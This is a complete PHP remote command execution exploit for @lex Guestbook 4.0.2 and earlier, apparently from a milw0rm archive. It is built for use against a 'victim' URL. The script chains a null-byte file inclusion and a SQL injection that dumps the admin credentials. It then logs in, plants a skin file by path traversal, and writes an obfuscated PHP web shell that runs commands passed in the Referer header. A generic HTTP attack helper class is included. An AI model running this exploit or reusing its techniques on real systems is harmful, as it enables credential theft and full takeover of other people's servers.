#!/usr/bin/php
<?php
/*/
 |
 | header> @lex Guestbook <= 4.0.2 Remote Command Execution Exploit
 | header> ========================================================
 | status> Retrieving the administrator password
 | sploit> AdminUsername::root
 | sploit> AdminPassword::toor
 | status> Trying to get logged in
 | sploit> Done
 | status> Trying to add a skin
 | sploit> Done
 | status> Writing the malicious skin
 | $shell> whoami
 | darkfig
 |
 | $shell> cat /etc/passwd ...
 |
/*/

if($argc < 2)
{
       print "\n---------------------------------------------------------";
       print "\nAffected.scr..: @lex Guestbook <= 4.0.2"; // last version
       print "\nPoc.ID........: 20070107";
       print "\nType..........: PHP Code Execution";
       print "\nRisk.level....: High";
       print "\nSrc.download..: www.alexphpteam.com";
       print "\nPoc.link......: acid-root.new.fr/poc/20070107.txt";
       print "\nCredits.......: DarkFig";
       print "\n---------------------------------------------------------";
       print "\nUsage.........: php xpl.php <url>";
       print "\nProxyOptions..: <proxhost:proxport> <proxuser:proxpass>";
       print "\nExample.......: php xpl.php http://victim.com/@lexgb/";
       print "\n---------------------------------------------------------\n";
       exit(1);
}

$url=$argv[1];
$prs=$argv[2];
$pra=$argv[3];

$xpl = new phpsploit();
$xpl->agent("Sploitzilla");
if(!empty($prs)) $xpl->proxy($prs);
if(!empty($pra)) $xpl->proxyauth($pra);

/*/
 |
 | index.php
 | =========
 | ... include($chem_absolu."include/livre_include.".$alex_livre_ext);
 |
 |
 | livre_include.php -> Local File Inclusion
 | =================
 | ... set_magic_quotes_runtime(0); // thx =)
 | ... if (isset($_GET['lang']) && $_GET['lang'] && file_exists($chem_absolu."languages/".$_GET['lang'].".".$alex_livre_ext))
 | $f_language = str_replace("..","",$_GET['lang']); // We can't use .... because of file_exists() verification but ... =]
 | include($chem_absolu."languages/".$f_language.".".$alex_livre_ext);
 |
 |
 |  index.php -> SQL Injection
 |  =========
 |  ... sql_select_query("msg", "alex_livre_txt_lang", "WHERE lang='".$f_language."' and `type`='titre'");
 |  // "SELECT msg FROM `alex_livre_txt_lang` WHERE lang='$f_language' and type=`titre`
 |
/*/

$sql = "index.php?lang=english.php%00'%20union%20select%20".
      "concat('XPLLogin:',(select%20login%20from%20alex_livr".
      "e_users%20LIMIT%201),'XPLPass:',(select%20pass%20from".
      "%20alex_livre_users%20LIMIT%201))/*";

print "\nheader> @lex Guestbook <= 4.0.2 Remote Command Execution Exploit";
print "\nheader> ========================================================";
print "\nstatus> Retrieving the administrator password";
$xpl->get($url.$sql);

if(preg_match('#<div class="d_title">XPLLogin:(.*)XPLPass:(.*)</div>#',$xpl->getcontent(),$count))
print "\nsploit> AdminUsername::".$count[1]."\nsploit> AdminPassword::".$count[2];
else die("\nsploit> Exploit failed");

print "\nstatus> Trying to get logged in";
$xpl->post($url."admin/index.php","f_login=".$count[1]."&f_pass=".$count[2]."&f_identif=Identification");
if(preg_match("#f_cadres\.php\?f_sid=([a-z0-9]{32})#",$xpl->getheader(),$sid)) print "\nsploit> Done";
else die("\nsploit> Exploit failed");

print "\nstatus> Trying to add a skin";
// skins.php ... @mkdir($chem_absolu."templates/skins/".$_POST['aj_skin']."/", 0755)
$xpl->post($url."admin/skins.php?f_sid=".$sid[1],"aj_skin=../../languages/d4h4x0rskin&ajouter=Ajouter");
if(!preg_match('#alert\("ERREUR\n#',$xpl->getcontent())) print "\nsploit> Done";
else die("\nsploit> Exploit failed");

$scode = "chr(0x73).chr(0x79).chr(0x73).chr(0x74).chr(0x65).chr(0x6d).".
        "chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69).chr(0x70).".
        "chr(0x73).chr(0x6c).chr(0x61).chr(0x73).chr(0x68).chr(0x65).".
        "chr(0x73).chr(0x28).chr(0x24).chr(0x5f).chr(0x53).chr(0x45).".
        "chr(0x52).chr(0x56).chr(0x45).chr(0x52).chr(0x5b).chr(0x27).".
        "chr(0x48).chr(0x54).chr(0x54).chr(0x50).chr(0x5f).chr(0x52).".
        "chr(0x45).chr(0x46).chr(0x45).chr(0x52).chr(0x45).chr(0x52).".
        "chr(0x27).chr(0x5d).chr(0x29).chr(0x29).chr(0x3b)";

$data  = "skin_edit=skins.php%3Ff_sid%3D".$sid[1]."%26skin_edit".
        "%3D../../languages/d4h4x0rskin&alex_livre=<?php\r\n@e".
        "val($scode);exit(0);\r\n?>&add_message=&nb_message_pa".
        "ge=&list_pages=&corps_messages=&space=&assembly=&enre".
        "gistrer=Enregistrer";

print "\nstatus> Writing the malicious skin\n\$shell> ";
// skins.php ... write($chem_absolu."templates/skins/".$_GET['skin_edit']."/".$tab_template_guestbook[$i])
$xpl->post($url."admin/skins.php?skin_edit=../../languages/d4h4x0rskin&f_sid=".$sid[1],$data);

while(!preg_match("#^(quit|exit)$#",($cmd = trim(fgets(STDIN)))))
{
   $xpl->addheader("Referer",$cmd);
   $xpl->get($url."index.php?lang=d4h4x0rskin/alex_livre.css%00");
   print $xpl->getcontent();
   print "\n\$shell> ";
}

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport);
		else $socket = fsockopen($this->host,$this->port);
		
		if(!$socket) die("Error: The host doesn't exist");
		
		if($this->method==="get") $this->packet = "GET ".$this->url." HTTP/1.1\r\n";
		elseif($this->method==="post") $this->packet = "POST ".$this->url. " HTTP/1.1\r\n";
		else die("Error: Invalid method");
		
		if(!empty($this->proxyuser)) $this->packet .= "Proxy-Authorization: Basic ".base64_encode($this->proxyuser.":".$this->proxypass)."\r\n";
		$this->packet .= "Host: ".$this->host."\r\n";
		
		if(!empty($this->agent))  $this->packet .= "User-Agent: ".$this->agent."\r\n";
		if(!empty($this->header)) $this->packet .= $this->header."\r\n";
		if(!empty($this->cookie)) $this->packet .= "Cookie: ".$this->cookie."\r\n";
		
		$this->packet .= "Connection: Close\r\n";
		if($this->method==="post")
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		$this->packet .= "\r\n";
		$this->recv = '';
		
		fputs($socket,$this->packet);
		while(!feof($socket)) $this->recv .= fgets($socket);
		fclose($socket);
		
		if($this->cookiejar) $this->cookiejar($this->getheader($this->recv));
		if($this->allowredirection) return $this->allowredirection($this->recv);
		else return $this->recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this->addcookie("name","value");
	 * or
	 * $this->addcookie("name=newvalue");
	 * or
	 * $this->addcookie("othername=overvalue; xx=zz; y=u");
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv='')
	{
		// $this->addcookie("name","value"); work avec replace
		if(!empty($cookv))
		{
			if($cookv === "deleted") $cookv=''; // cookiejar(1) && Set-Cookie: name=delete
			if(!empty($this->cookie))
			{
			    if(preg_match("/$cookn=/",$this->cookie))
			    {
			    	$this->cookie = preg_replace("/$cookn=(\S*);/","$cookn=$cookv;",$this->cookie);
			    }
			    else
			    {
			    	$this->cookie .= " ".$cookn."=".$cookv.";"; // " ".
			    }
			}
			else
			{
				$this->cookie = $cookn."=".$cookv.";";
			}
		}
		// $this->addcookie("name=value; othername=othervalue");
		else
		{
	    	 if(!empty($this->cookie))
	    	 {
	    	 	$cookn = preg_replace("/(.*);$/","$1",$cookn);
	    	 	$cookarr = explode(";",str_replace(" ", "",$cookn));
	    	 	for($i=0;$i<count($cookarr);$i++)
	    	 	{
	    	 		preg_match("/(\S*)=(\S*)/",$cookarr[$i],$matches);
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this->addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===";") ? $cookn : $cookn.";";
			 	$this->cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this->addheader("headername","headervalue");
	 * or
	 * $this->addheader("headername: headervalue");
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue='')
	{
		// $this->addheader("name","value");
		if(!empty($headervalue))
		{
			if(!empty($this->header))
			{
				if(preg_match("/$headern:/",$this->header))
				{
					$this->header = preg_replace("/$headern: (\S*)/","$headern: $headervalue",$this->header);
				}
				else
				{
					$this->header .= "\r\n".$headern.": ".$headervalue;
				}
			}
			else
			{
				$this->header=$headern.": ".$headervalue;
			}
		}
		// $this->addheader("name: value");
		else 
		{
			if(!empty($this->header))
			{
				$headarr = explode(": ",$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this->addheader($headern,$headerv);
			}
			else
			{
				$this->header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this->proxy("proxyip","8118");
	 * or
	 * $this->proxy("proxyip:8118")
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp='')
	{
		// $this->proxy("localhost:8118");
		if(empty($proxyp))
		{
			preg_match("/^(\S*):(\d+)$/",$proxy,$proxarr);
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this->proxyhost=$proxh;
			$this->proxyport=$proxp;
		}
		// $this->proxy("localhost",8118);
		else 
		{
			$this->proxyhost=$proxy;
			$this->proxyport=intval($proxyp);
		}
		if($this->proxyport > 65535) die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this->proxyauth("darkfig","dapasswd");
	 * or
	 * $this->proxyauth("darkfig:dapasswd");
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse='')
	{
		// $this->proxyauth("darkfig:password");
		if(empty($proxypasse))
		{
			preg_match("/^(.*):(.*)$/",$proxyauth,$proxautharr);
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this->proxyuser=$proxu;
			$this->proxypass=$proxp;
		}
		// $this->proxyauth("darkfig","password");
		else
		{
			$this->proxyuser=$proxyauth;
			$this->proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the "User-Agent" header.
	 * Several methods are possible to do that:
	 * 
	 * $this->agent("Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent: Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent","Mozilla Firefox");
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this->agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this->showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this->header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this->showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this->cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this->showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this->packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * GET method. You can precise the port of the host.
	 * 
	 * $this->get("http://localhost");
	 * $this->get("http://localhost:888/xd/tst.php");
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this->target($url);
		$this->method="get";
		return $this->sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * POST method. You can precise the port of the host.
	 * 
	 * $this->post("http://localhost/index.php","admin=1&user=dark");
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this->target($url);
		$this->method="post";
		$this->data=$data;
		return $this->sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this->getcontent($this->get("http://localhost/"));
	 * or
	 * $this->getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code='')
	{
		if(empty($code)) $code = $this->recv;
		$content = explode("\n",$code);
		$onlycode = '';
		for($i=1;$i<count($content);$i++)
		{
			if(!preg_match("/^(\S*):/",$content[$i])) $ok = 1;
			if($ok) $onlycode .= $content[$i]."\n";
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this->getheader($this->post("http://localhost/x.php","x=1&z=2"));
	 * or
	 * $this->getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code='')
	{
		if(empty($code)) $code = $this->recv;
		$header = explode("\n",$code);
		$onlyheader = $header[0]."\n";
		for($i=1;$i<count($header);$i++)
		{
			if(!preg_match("/^(\S*):/",$header[$i])) break;
			$onlyheader .= $header[$i]."\n";
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the "Set-Cookie" header in the "Cookie"
	 * header for the next request. You don't have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode("\n",str_replace("\r\n","\n",$code));
		for($z=0;$z<count($carr);$z++)
		{
			if(preg_match("/set-cookie: (.*)/i",$carr[$z],$cookarr))
			{
				$cookie[] = preg_replace("/expires=(.*)(GMT||UTC)(\S*)$/i","",preg_replace("/path=(.*)/i","",$cookarr[1]));
			}
		}

		for($i=0;$i<count($cookie);$i++)
		{
			preg_match("/(\S*)=(\S*);/",$cookie[$i],$matches);
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this->addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		if(!preg_match("/^http:\/\/(.*)\//",$urltarg)) $urltarg .= "/";
		$this->url=$urltarg;
		
		$array = explode("/",str_replace("http://","",preg_replace("/:(\d+)/","",$urltarg)));
		$this->host=$array[0];

		preg_match("/:(\d+)\//",$urltarg,$matches);
		$this->port=empty($matches[1]) ? 80 : $matches[1];
		
		$temp = str_replace("http://","",preg_replace("/:(\d+)/","",$urltarg));
		preg_match("/\/(.*)\//",$temp,$matches);
		$this->path=str_replace("//","/","/".$matches[1]."/");
	
		if($this->port > 65535) die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all "Set-Cookie" headers values
	 * and it will automatically add them into the "Cookie" header
	 * for all next requests.
	 *
	 * $this->cookiejar(1); // enabled
	 * $this->cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this->cookiejar='';
		if($code===1) $this->cookiejar=1;
		else
		{
			$this->getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this->allowredirection(1); // enabled
	 * $this->allowredirection(0); // disabled
	 * 
	 * @return $this->get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this->allowredirection='';
		if($code===1) $this->allowredirection=1;
		else
		{
			if(preg_match("/(location|content-location|uri): (.*)/i",$code,$codearr))
			{
				$location = str_replace(chr(13),'',$codearr[2]);
				if(!eregi("://",$location))
				{
					return $this->get("http://".$this->host.$this->path.$location);
				}
				else
				{
					return $this->get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this->reset(header); // headers cleaned
	 * $this->reset(cookie); // cookies cleaned
	 * $this->reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func='')
	{
		switch($func)
		{
			case "header":
			$this->header='';
			break;
			
			case "cookie":
			$this->cookie='';
			break;
			
			default:
		        $this->cookiejar='';
		        $this->header='';
		        $this->cookie='';
		        $this->allowredirection=''; 
		        $this->agent='';
		        break;
		}
	}
}

# milw0rm.com [2007-01-08]
